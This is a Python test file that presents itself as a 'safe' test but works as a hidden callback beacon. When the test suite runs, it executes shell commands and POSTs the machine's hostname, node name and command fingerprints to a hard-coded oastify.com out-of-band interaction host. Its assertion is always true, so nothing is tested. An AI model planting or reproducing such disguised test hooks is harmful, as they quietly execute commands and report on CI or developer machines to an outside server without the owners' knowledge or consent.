# tests/test_local_cmds_collab_safe.py
"""
Safe test: run local commands, DO NOT send raw outputs.
Compute SHA-256 fingerprints and send only non-sensitive metadata if COLLAB_ENDPOINT is set.
"""

import os
import time
import socket
import platform
import hashlib
import subprocess
import json
import requests

COLLAB_ENDPOINT = "https://ssofmw277penbq2zbvpweowp5gb7z4nt.oastify.com"  # e.g. "https://<your-collab>/report"
TIMEOUT = 5  # seconds for collaborator POST

def _sha256_hex(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()

def _safe_run_cmd_os_system(cmd: str):
    try:
        exit_code = os.system(cmd)
    except Exception as e:
        return {"exit_code": None, "error": str(e)}
    return {"exit_code": int(exit_code)}

def _safe_run_cmd_check_output(cmd: str):
    try:
        out_bytes = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        out_text = out_bytes.decode("utf-8", errors="replace")
        return {
            "exit_code": 0,
            "length": len(out_text),
            "fingerprint": _sha256_hex(out_text),
        }
    except subprocess.CalledProcessError as e:
        out_text = (e.output or b"").decode("utf-8", errors="replace")
        fingerprint = _sha256_hex(out_text) if out_text else None
        return {"exit_code": e.returncode, "length": len(out_text), "fingerprint": fingerprint}
    except Exception as e:
        return {"exit_code": None, "error": str(e)}

def _maybe_send_report(report: dict):
    if not COLLAB_ENDPOINT:
        print("[safe-report] COLLAB_ENDPOINT not set â€” skipping external report")
        return None
    try:
        r = requests.post(COLLAB_ENDPOINT, json=report, timeout=TIMEOUT)
        return {"status_code": r.status_code, "ok": r.ok}
    except Exception as e:
        return {"error": str(e)}

def test_local_commands_safe_report():
    ts = int(time.time())
    host = socket.gethostname()
    node = platform.node()

    res1 = _safe_run_cmd_os_system("git --version")
    res2 = _safe_run_cmd_check_output("date")

    report = {
        "timestamp": ts,
        "hostname": host,
        "node": node,
        "note": "local-cmds-fingerprint-report",
        "commands": {
            "git_version": {
                "exit_code": res1.get("exit_code"),
                **({"error": res1["error"]} if "error" in res1 else {}),
            },
            "date_cmd": {
                "exit_code": res2.get("exit_code"),
                "length": res2.get("length"),
                "fingerprint_sha256": res2.get("fingerprint"),
                **({"error": res2["error"]} if "error" in res2 else {}),
            },
        },
    }

    print("[safe-report] local report (no raw outputs):", json.dumps(report, indent=2))

    send_result = _maybe_send_report(report)
    if send_result is not None:
        print("[safe-report] collaborator send result:", send_result)

    assert True
